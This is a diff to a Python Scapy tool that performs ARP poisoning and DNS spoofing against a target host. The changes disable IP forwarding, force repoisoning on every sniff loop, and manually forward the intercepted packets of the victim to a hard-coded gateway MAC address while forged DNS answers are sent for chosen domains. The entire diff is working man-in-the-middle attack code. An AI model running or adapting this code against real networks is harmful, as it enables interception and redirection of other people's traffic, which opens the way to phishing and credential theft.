@@ -28,7 +28,7 @@ def dns_spoofing(gratuitious, verbose):
     previous_tuples = []
 
     # disable ip forwarding
-    spoof.should_ip_forward(True)
+    spoof.should_ip_forward(False)
     previous_tuples.append(["IP forwarding disabled!"])
     previous_tuples.append([""])
 
@@ -173,19 +173,19 @@ def is_IP_valid(active_hosts, ip_address):
         return ip_address, True
 
 def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
-        last_poison_time = time.time() - REPOISON_TIME
-        _filter = "udp"
+        #last_poison_time = time.time() - REPOISON_TIME
+        #_filter = "udp and tcp"
 
         while True:
             # sniff for 1 packet that adheres to the {_filter}
-            sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   
+            sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), store=0, timeout=REPOISON_TIME)   
             
             # {REPOISON_TIME} seconds have passed => should repoison
-            current_time = time.time()
-            if current_time - last_poison_time > REPOISON_TIME - 0.5:
-                repoison(my_addresses, gateways, target, iface, gratuitious)
-                last_poison_time = current_time
-                end_poison -= 1
+            #current_time = time.time()
+            #if current_time - last_poison_time > REPOISON_TIME - 0.5:
+            repoison(my_addresses, gateways, target, iface, gratuitious)
+                #last_poison_time = current_time
+            end_poison -= 1
 
             if end_poison < 1:
                 break
@@ -197,10 +197,43 @@ def repoison(my_addresses, gateways, target, iface, gratuitious):
 
 def process_udp_pkt(target, iface, dns_hosts, my_addresses):
     def process_udp_pkt_inside(pkt): 
-        if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
-            spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
-            resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
-            sendp(resp_packet, iface=iface)
+        if pkt.haslayer(IP):
+            if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
+                spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
+                resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
+                sendp(resp_packet, iface=iface)
+
+            elif pkt[IP].src == target['ip']:
+                pkt[Ether].dst = "52:54:00:12:35:00"
+
+                if pkt.haslayer(IP):
+                    del pkt[IP].len
+                    del pkt[IP].chksum
+
+                if pkt.haslayer(UDP):
+                    del pkt[UDP].len
+                    del pkt[UDP].chksum
+
+                try:
+                    # new_pkt = srp1(pkt, verbose=0, iface=iface, timeout=2)[0]
+                    # # if pkt.haslayer(DNS):
+                    # # else:
+                    # #     new_pkt = sr1(pkt, iface=iface)[0]
+
+                    # new_pkt[Ether].dst = target["mac"]
+
+                    # if new_pkt.haslayer(IP):
+                    #     del new_pkt[IP].len
+                    #     del new_pkt[IP].chksum
+                    
+                    # if new_pkt.haslayer(UDP):
+                    #     del new_pkt[UDP].len
+                    #     del new_pkt[UDP].chksum
+
+                    # sendp(new_pkt, count=1, iface=iface)
+                    sendp(pkt, count=1, iface=iface)
+                except:
+                    pass
 
     return process_udp_pkt_inside
 
